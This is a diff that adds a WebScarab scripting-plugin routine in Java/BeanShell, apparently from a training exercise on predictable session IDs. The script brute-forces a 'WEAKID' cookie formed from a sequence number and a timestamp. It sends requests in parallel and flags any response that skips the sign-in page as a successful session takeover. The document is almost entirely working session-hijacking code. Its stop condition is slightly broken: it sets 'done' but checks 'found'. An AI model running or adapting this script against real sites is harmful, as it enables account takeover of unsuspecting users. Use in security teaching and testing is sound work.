@@ -1,0 +1,69 @@
+import org.owasp.webscarab.model.ConversationID;
+import org.owasp.webscarab.model.HttpUrl;
+import org.owasp.webscarab.model.Request;
+import org.owasp.webscarab.model.Response;
+import javax.swing.JOptionPane;
+
+String templ = JOptionPane.showInputDialog("Which request is the template?");
+String seqStr = JOptionPane.showInputDialog("Enter sequence number");
+String startStr = JOptionPane.showInputDialog("Enter start time");
+String endStr = JOptionPane.showInputDialog("Enter end time");
+
+int template   = Integer.parseInt(templ);
+long seq       = Long.parseLong(seqStr);
+long startTime = Long.parseLong(startStr);
+long endTime   = Long.parseLong(endStr);
+boolean found  = false;
+
+// a counter, so we can know when to stop
+long time = startTime;
+
+// call this to fetch them in parallel
+// the number of simultaneous connections is controlled by the Scripting plugin 
+// It is currently fixed at 4 simultaneous requests
+
+void fetchParallel() {
+    while (hasMoreRequests() || scripted.isAsyncBusy()) {
+        while (scripted.hasAsyncCapacity() && hasMoreRequests()) {
+            scripted.submitAsyncRequest(getNextRequest());
+            Thread.sleep(100);
+        }
+        if (scripted.hasAsyncResponse()) {
+            while (scripted.hasAsyncResponse()) {
+                response = scripted.getAsyncResponse();
+                request = response.getRequest();
+                String body = new String(response.getContent());
+                if (body.indexOf("Please sign in to your account") == -1) {
+                    done = true;
+                    ConversationID id = scripted.addConversation(response);
+                    out.println("Success with conversation " + id);
+                }
+            }
+        } else Thread.sleep(100);
+    }
+}
+
+// modify this routine to determine when we are finished
+boolean hasMoreRequests() {
+    return !found && time<endTime;
+}
+
+String encode(long seq, long time) {
+    return Long.toString(seq) + "-" + Long.toString(time);
+}
+
+// modify this routine to construct the next request
+Request getNextRequest() {
+    // create a new request copied from the template
+    Request request = scripted.getRequest(template);
+    String cookie = request.getHeader("Cookie");
+    String wg = encode(seq, time++);
+    cookie = "WEAKID=" + wg + "; " + cookie;
+    request.setHeader("Cookie", cookie);
+    out.println("Trying " + cookie);
+    return request;
+}
+
+
+fetchParallel();
+
